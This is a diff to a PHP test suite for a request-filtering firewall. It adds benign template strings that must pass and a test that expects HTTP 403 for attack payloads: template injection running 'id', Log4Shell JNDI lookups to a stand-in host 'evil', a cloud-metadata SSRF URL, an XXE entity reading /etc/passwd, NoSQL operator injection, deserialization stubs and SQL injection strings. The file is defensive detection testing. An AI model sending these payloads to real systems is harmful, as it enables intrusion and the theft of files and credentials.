@@ -163,6 +163,10 @@ class DetectMaliciousRequestsTest extends TestCase
             'inline png data uri'  => [['avatar'  => 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=']],
             'dot-env in prose'     => [['comment' => 'See section 3.Environment for details']],
             'ampersand prose'      => [['comment' => 'We sell black & cat food and dog food']],
+            'vue template'         => [['tpl' => 'Hello {{ user.name }}, welcome back']],
+            'js template literal'  => [['code' => 'const s = `${user.name} <${user.email}>`;']],
+            'html5 doctype'        => [['html' => '<!DOCTYPE html><p>hi there</p>']],
+            'shell var in prose'   => [['msg' => 'The total price is ${price} today']],
         ];
     }
 
@@ -200,6 +204,31 @@ class DetectMaliciousRequestsTest extends TestCase
             'stacked + comment'   => [['id' => "1'; DELETE FROM logs WHERE 1=1 --"]],
             'into outfile'        => [['q' => "1 UNION SELECT 0x1 INTO OUTFILE '/tmp/x'"]],
             'error based'         => [['id' => 'extractvalue(1,concat(0x7e,version()))']],
+        ];
+    }
+
+    /**
+     * Défense en profondeur : classes d'attaque auparavant absentes du ruleset.
+     *
+     * @test
+     * @dataProvider newlyCoveredAttackClasses
+     */
+    public function it_now_detects_previously_missed_attack_classes(array $body)
+    {
+        $this->postJson('/test-waf', $body)->assertStatus(403);
+    }
+
+    public static function newlyCoveredAttackClasses(): array
+    {
+        return [
+            'SSTI expression lang' => [['x' => '${T(java.lang.Runtime).getRuntime().exec("id")}']],
+            'Log4Shell JNDI'       => [['h' => '${jndi:ldap://evil/a}']],
+            'Log4Shell obfusqué'   => [['h' => '${${lower:j}ndi:rmi://x/y}']],
+            'SSRF cloud metadata'  => [['url' => 'http://169.254.169.254/latest/meta-data/']],
+            'NoSQL operator'       => [['user' => ['$ne' => 'x']]],
+            'XXE external entity'  => [['xml' => '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>']],
+            'PHP deserialization'  => [['s' => 'O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}']],
+            'Java deserialization' => [['s' => 'rO0ABXNyABFqYXZhLnV0aWwu']],
         ];
     }
 
